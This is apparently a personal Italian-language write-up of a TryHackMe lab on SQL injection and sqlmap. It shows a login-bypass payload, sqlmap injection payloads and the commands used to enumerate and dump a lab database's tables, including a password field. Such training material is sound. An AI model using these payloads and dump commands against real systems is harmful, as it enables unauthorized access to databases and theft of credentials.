#tryhackmelabs #laboratorio 

https://tryhackme.com/room/sqlmapthebasics

## Introduzione

L'iniezione SQL è una vulnerabilità comune nella sicurezza informatica che sfrutta le interazioni tra siti web e database. Un database è una raccolta strutturata di dati che consente l'archiviazione, la modifica e il recupero delle informazioni. I siti web utilizzano database per gestire i dati degli utenti, come le credenziali di accesso, e per fornire contenuti dinamici, come la ricerca di libri in una libreria online.

Questa interazione avviene tramite sistemi di gestione di database (DBMS) come MySQL o PostgreSQL, che utilizzano il linguaggio di query strutturato (SQL) per eseguire operazioni sui dati. L'iniezione SQL si verifica quando un attaccante inserisce codice SQL malevolo in un campo di input, compromettendo la sicurezza del database e potenzialmente accedendo a dati riservati o alterando le informazioni.

Quale linguaggio costruisce l'interazione tra un sito web e il suo database?
```
SQL
```

## Vulnerabilità di iniezione SQL

Prendiamo come esempio una pagina di login che ti chiede di inserire nome utente e password per effettuare l'accesso. Forniamo i seguenti dati:

`Username: John`

`Password: Un@detectable444`

Una volta inseriti nome utente e password, il sito web li riceverà, effettuerà una query SQL con le tue credenziali e li invierà al database. 

```php
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

Questa query verrà eseguita nel database. In base a questa query, il database cercherà un utente di nome  `John`e la relativa password  `Un@detectable444`. Se trova tale utente, ne restituirà i dettagli all'applicazione. Si noti che la query di cui sopra avrà esito positivo solo se l'utente e la password specificati hanno una corrispondenza nel database, poiché sono separati dal operatore booleano "AND".

A volte, quando l'input viene sanificato in modo improprio, ovvero quando l'input dell'utente non viene convalidato, gli aggressori possono manipolarlo e scrivere query SQL che vengono eseguite nel database ed eseguono le azioni desiderate. L'iniezione SQL ha un effetto molto dannoso in questo mondo digitale, poiché tutte le organizzazioni archiviano i propri dati, comprese le informazioni critiche, all'interno dei database, e un attacco di iniezione SQL riuscito può compromettere i dati critici.

Supponiamo che la pagina di accesso al sito web di cui abbiamo parlato sopra non disponga di validazione e sanificazione degli input. Ciò significa che è vulnerabile a SQL injection. L'attaccante non conosce la password dell'utente John. Digiterà il seguente input nei campi indicati:

`Username: John`

`Password: abc' OR 1=1;-- -`

Questa volta, l'attaccante ha digitato una stringa casuale `abc` e una stringa iniettata `' OR 1=1;-- -`. La query SQL che il sito web invierà al database diventerà ora la seguente:

```php
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```

Questa istruzione è simile alla query SQL precedente , ma ora aggiunge un'altra condizione con l'operatore `OR`. Questa query verificherà se esiste un utente, John. Quindi, controllerà se John ha la password `abc`(che non può avere perché l'attaccante ha inserito una password casuale). Idealmente, la query dovrebbe fallire qui perché si aspetta che sia il nome utente che la password siano corretti, poiché c'è un `AND`operatore tra di essi. Tuttavia, questa query ha un'altra condizione, `OR`, tra la password e un'istruzione `1=1`. Qualsiasi condizione vera renderà l'intera query SQL riuscita. La password è fallita, quindi la query verificherà la condizione successiva, che verifica se `1=1`. Come sappiamo, `1=1`è sempre vera, quindi ignorerà la password casuale inserita prima e considererà questa istruzione come vera, il che eseguirà correttamente questa query. alla `-- -`fine della query commenterebbe tutto ciò che segue `1=1`, il che significa che la query verrebbe eseguita correttamente e l'attaccante accederebbe all'account utente di John.

Una delle cose importanti da notare qui è l'uso di un apice singolo `'`dopo `abc`. Senza questo apice singolo, `'`l'intera stringa `'abc OR 1=1;-- -'`verrebbe considerata la password, il che non è previsto. Tuttavia, se aggiungiamo un apice singolo `'`dopo `abc`, la password apparirà come `'abc' OR 1=1;---'`, che racchiude la stringa originale abc nella query e ci consente di introdurre una condizione logica `OR 1=1`, che è sempre vera.

Rispondi alle domande seguenti

Quale operatore booleano controlla se almeno un lato dell'operatore è vero affinché la condizione sia vera?

```
OR
```

In una query SQL, 1=1 è sempre vero? (SÌ/NO)

```
YEA
```

## Strumento di iniezione SQL automatizzato

Eseguire un attacco SQL injection implica scoprire la vulnerabilità di SQL injection all'interno dell'applicazione e manipolare il database. Tuttavia, eseguire manualmente tutte queste operazioni può richiedere tempo e impegno.

SQLMap è uno strumento automatico per rilevare e sfruttare le vulnerabilità di SQL injection nelle applicazioni web. Semplifica il processo di identificazione di queste vulnerabilità. Questo strumento è integrato in alcune distribuzioni Linux , ma potete installarlo facilmente se non lo è.

Trattandosi di uno strumento da riga di comando, è necessario aprire il terminale del sistema operativo Linux per utilizzarlo. Il comando con SQLMap elencherà tutti i flag disponibili. Se non si desidera aggiungere manualmente i flag a ciascun comando, utilizzare il flag con SQLMap . Quando si utilizza questo flag, lo strumento guiderà l'utente attraverso ogni passaggio e porrà delle domande per completare la scansione, rendendolo un'opzione perfetta per i principianti.`--help``--wizard`

```
sqlmap --wizard
```

Il `--dbs`flag aiuta a estrarre tutti i nomi dei database. Una volta conosciuti i nomi dei database, è possibile estrarre informazioni sulle tabelle di quel database utilizzando `-D database_name --tables`. Dopo aver ottenuto le tabelle, se si desidera enumerare i record in quelle tabelle, è possibile utilizzare `-D database_name -T table_name --dump`. I diversi flag nello strumento SQLMap consentono di estrarre informazioni dettagliate dai database. Ora, consideriamo uno scenario pratico e utilizziamo tutti i flag sopra menzionati per sfruttare un'applicazione web vulnerabile a SQL injection.

Il primo passo è cercare un URL o una richiesta potenzialmente vulnerabile. Spesso si incontrano URL che utilizzano parametri GET per recuperare i dati. Ad esempio, un URL come `http://sqlmaptesting.thm/search?cat=1`utilizza un parametro `cat`che accetta il valore `1`. Se si nota un'applicazione web che utilizza parametri GET negli URL per recuperare i dati, è possibile testare tale URL con il flag -u nello strumento SQLMap . Questo è considerato un test basato su HTTP GET. Questo approccio viene seguito quando l'applicazione utilizza parametri GET nell'URL per recuperare i dati dalle ricerche.

Per la dimostrazione, useremo l'URL di un sito web presumibilmente vulnerabile: . `http://sqlmaptesting.thm` Supponiamo che questo sito web abbia un'opzione di ricerca e, quando si clicca su questa opzione di ricerca e si cerca qualcosa, l'URL diventa `http://sqlmaptesting.thm/search/cat=1`, che utilizza il parametro GET `cat=1`nell'URL per estrarre informazioni dal database. Come sappiamo, gli URL con parametri GET possono essere vulnerabili a SQL injection; analizziamo questo URL per identificare eventuali vulnerabilità di SQL injection.

```
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1
      __H__
 ___ ___[']_____ ___ ___  {1.2.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:43:49] [INFO] testing connection to the target URL
[08:43:49] [INFO] heuristics detected web page charset 'ascii'
[08:43:49] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[08:43:49] [INFO] testing if the target URL content is stable
[08:43:50] [INFO] target URL content is stable
[08:43:50] [INFO] testing if GET parameter 'cat' is dynamic
[text removed]
[08:45:04] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
[text removed]
[08:45:08] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: cat=1 AND EXTRACTVALUE(1846,CONCAT(0x5c,0x716a787071,(SELECT (ELT(1846=1846,1))),0x7170766a71))

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: cat=1 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: cat=1 UNION ALL SELECT CONCAT(0x716a787071,0x714d486661414f6456787a4a55796b6c7a78574f7858507a6e6a725647436e64496f4965794c6873,0x7170766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HMgq
---
[08:45:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[text removed]
```

I risultati nel terminale soprastante mostrano che nell'URL di destinazione sono identificati diversi tipi di SQL injection, come query cieche basate su valori booleani, query cieche basate su errori, query cieche basate su tempo e query UNION. Si tratta di tecniche diverse per sfruttare una vulnerabilità di SQL injection. Ad esempio, nella SQL injection cieca basata su valori booleani, la query SQL viene modificata e un'espressione booleana (che è sempre vera, ad esempio, `1=1`) viene inclusa nella query per estrarre le informazioni. Mentre nella SQL injection basata su errori, alcune query vengono intenzionalmente modificate per generare errori nei risultati inviati dal database. Questi errori spesso contengono informazioni preziose sui dati. Analogamente, anche altre tecniche di SQL injection possono essere impiegate per sfruttare un database.

I risultati del comando eseguito per il nostro target `http://sqlmaptesting.thm/search/cat=1`ci dicono che su questo URL sono possibili diversi tipi di SQL injection. Utilizziamo i flag di SQLMap , che abbiamo studiato in precedenza, per sfruttarli ed estrarre dati preziosi dal database.

Per recuperare i database, usiamo il flag `--dbs`. Proviamo questo flag con il nostro URL vulnerabile:

```
```shell-session
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:49:00] [INFO] resuming back-end DBMS' mysql' 
[08:49:00] [INFO] testing connection to the target URL
[08:49:01] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[text removed]    
[08:49:01] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:49:01] [INFO] fetching database names
available databases [2]:
[*] users
[*] members

[text removed]
```

Dopo aver eseguito il comando precedente, abbiamo ottenuto due nomi di database. Selezioniamo il  `users` database e recuperiamo le tabelle al suo interno. Definiremo il database dopo il flag `-D`e useremo il `--tables`flag alla fine per estrarre tutti i nomi delle tabelle.

Estrazione delle tabelle

```shell-session
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:50:46] [INFO] resuming back-end DBMS' mysql' 
[08:50:46] [INFO] testing connection to the target URL
[08:50:46] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[text removed]
[08:50:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:50:46] [INFO] fetching tables for database: 'users'
Database: acuart
[3 tables]
+-----------+
| johnath   |
| alexas    |
| thomas    |     
+-----------+

[text removed]

```

Ora che abbiamo tutti i nomi delle tabelle disponibili del database, eseguiamo il dump dei record presenti nella `thomas` tabella. Per farlo, definiremo il database con il  `-D`flag, la tabella con il  `-T`flag e per estrarre i record della tabella useremo il  `--dump`flag.

```

user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:51:48] [INFO] resuming back-end DBMS' mysql' 
[08:51:48] [INFO] testing connection to the target URL
[08:51:49] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[text removed]
[08:51:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:51:49] [INFO] fetching columns for table 'thomas' in database 'users'
[08:51:49] [INFO] fetching entries for table 'thomas' in database' users'
[08:51:49] [INFO] recognized possible password hashes in column 'passhash'
do you want to store hashes to a temporary file for eventual further processing n
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: users
Table: thomas
[1 entry]
+---------------------+------------+---------+
| Date                | name       | pass    |    
+---------------------+------------+----------
| 09/09/2024          | Thomas THM | testing |    
+---------------------+------------+---------+

[text removed]
```

Tuttavia, a differenza dell'URL utilizzato per il test sopra, è possibile utilizzare anche test basati su POST, in cui l'applicazione invia i dati nel corpo della richiesta anziché nell'URL. Esempi di questo potrebbero essere i moduli di accesso, i moduli di registrazione, ecc. Per seguire questo approccio, è necessario intercettare una richiesta POST nella pagina di accesso o di registrazione e salvarla come file di testo. È possibile utilizzare il seguente comando per immettere la richiesta salvata nel file di testo nello strumento SQLMap :

```
sqlmap -r intercepted_request.txt
```

Quale flag nello strumento SQLMap viene utilizzato per estrarre tutti i database disponibili?
```
--dbs
```

Quale sarebbe il comando completo di SQLMap per estrarre tutte le tabelle dal database "members"? (URL vulnerabile: http://sqlmaptesting.thm/search/cat=1)
```
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables
```

## Esercizio Pratico

Utilizzerai questa macchina per eseguire l'iniezione SQL tramite lo strumento SQLMap .

**Nota:**  per questa attività si consiglia vivamente di utilizzare AttackBox.

L'applicazione web ha una pagina di login ospitata all'indirizzo `http://10.10.130.0/ai/login`. Visitando questo URL, verrà visualizzata una pagina di login vulnerabile a SQL injection.

Nell'attività precedente, abbiamo visto che se vediamo parametri GET nell'URL, questi potrebbero essere vulnerabili a SQL injection e possiamo copiare quell'URL per utilizzarlo con SQLMap . Abbiamo anche visto che se c'è una richiesta POST e i dati vengono inviati all'interno del corpo anziché dell'URL, possiamo intercettare la richiesta e utilizzarla con lo strumento SQLMap per sfruttare un'eventuale vulnerabilità di SQL injection.

Tuttavia, in questa attività, nella pagina di login, abbiamo utilizzato le richieste GET, ma i parametri di questa richiesta non sono visibili nell'URL come lo erano sul sito web dell'attività precedente. Per testare l'URL con SQLMap , dobbiamo avere l'URL insieme ai parametri GET.

Quindi, per ottenere l'URL completo insieme ai suoi parametri GET, dobbiamo fare clic con il pulsante destro del mouse sulla pagina di login e selezionare l'opzione "Ispeziona" (il processo può variare leggermente da browser a browser). Da qui, dobbiamo selezionare la scheda "Rete"; quindi, dobbiamo  inserire alcune credenziali di prova nei campi nome utente e password e fare clic sul pulsante "Accedi"; saremo in grado di visualizzare la richiesta GET. Facendo clic su tale richiesta, possiamo visualizzare la richiesta GET completa con i relativi parametri. Possiamo copiare questo URL completo e utilizzarlo con lo strumento SQLMap per individuare vulnerabilità di SQL injection al suo interno e sfruttarle. La richiesta completa è mostrata nello screenshot qui sotto:
```
http://10.10.130.0/ai/login
```

```
http://10.10.130.0/ai/includes/user_login?email=test%40test.com&password=Pluto
```


Esegui i comandi come descritto nell'attività precedente su questo URL e rispondi alle domande poste in questa attività. Ricorda inoltre di includere l'URL tra virgolette singole `'`. Questo per evitare errori con caratteri speciali nel terminale, come `?`.

**Nota importante:** potresti non ottenere i risultati desiderati con la scansione semplice; aggiungi `--level=5` alla fine dei comandi per eseguire scansioni approfondite. In secondo luogo, durante l'esecuzione dei comandi, lo strumento potrebbe porre alcune domande; assicurati di rispondere come segue per eseguire la scansione senza problemi:

- Sembra che il DBMS back-end sia "MySQL". Vuoi saltare i payload di test specifici per altri DBMS? [S/N]:`y`
- Per i test rimanenti, vuoi includere tutti i test per 'MySQL' estendendo il valore di rischio fornito (1)? [Y/n]:`y`
- Iniezione non sfruttabile con valori NULL. Vuoi provare con un valore intero casuale per l'opzione '--union-char'? [S/N]:`y`
- Il parametro GET 'email' è vulnerabile. Vuoi continuare a testare gli altri (se presenti)? [y/N]:`n`


Quanti database sono disponibili in questa applicazione web?

```
sqlmap -u "http://10.10.130.0/ai/includes/user_login?email=test%40test.com&password=Pluto" --dbs --level=5
```

```
6
```
Qual è il nome della tabella disponibile nel database "ai"?

```
sqlmap -u "http://10.10.130.0/ai/includes/user_login?email=test%40test.com&password=Pluto" -D ai --tables --level=5
```

```
user
```
Qual è la password dell'indirizzo email test@chatai.com?

```
sqlmap -u "http://10.10.130.0/ai/includes/user_login?email=test%40test.com&password=Pluto" -D ai -T user --dump --level=5
```

```
| id   | email           | created             | password   |
+------+-----------------+---------------------+------------+
| 1    | test@chatai.com | 2023-02-21 09:05:46 | xxxxxxxxxxx  
```

```
xxxxxxxxxxxxx
```

